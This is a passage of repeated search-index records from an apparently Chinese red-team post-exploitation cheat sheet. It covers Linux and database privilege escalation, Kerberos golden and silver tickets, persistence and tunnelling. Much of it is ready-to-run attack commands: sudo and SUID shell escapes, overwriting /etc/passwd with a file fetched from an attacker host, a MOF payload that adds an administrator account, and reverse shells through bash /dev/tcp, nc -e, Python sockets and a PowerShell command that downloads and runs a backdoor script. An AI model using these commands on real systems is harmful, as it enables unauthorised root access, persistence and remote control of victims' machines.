","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#5任务计划"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#6覆盖passwd提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#7ssh密钥提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#8john破解shadow-root密文登陆提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#9ubuntu计划任务反弹shell提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#数据库提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1mof提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2udf提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3mssql提权"},{"categories":["hvv"],"content":"\r白银票据和黄金票据\r九维团队-红队（突破）| 黄金白银票据攻击与防御 | CTF导航 (ctfiot.com) 黄金票据、白银票据 - 1_Ry - 博客园 (cnblogs.com) ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#白银票据和黄金票据"},{"categories":["hvv"],"content":"\rKerberos认证流程Client 与 AS 的交互, Client 与 TGS 的交互, Client 与 Server 的交互。 黄金票据是伪造TGT，白银票据则是伪造ST ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#kerberos认证流程"},{"categories":["hvv"],"content":"\r黄金票据在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。 所需条件: 1、域名称 2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值) 3、域的KRBTGT账号的HASH 4、伪造任意用户名 （获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限） ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#黄金票据"},{"categories":["hvv"],"content":"\r白银票据白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作 所需条件: 1.域名 2.域sid 3.目标服务器名 4.可利用的服务 5.服务账号的NTML HASH 6.需要伪造的用户名 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#白银票据"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#不同点"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#获取的权限不同"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#认证流程不同"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#加密方式不同"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#权限维持"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import 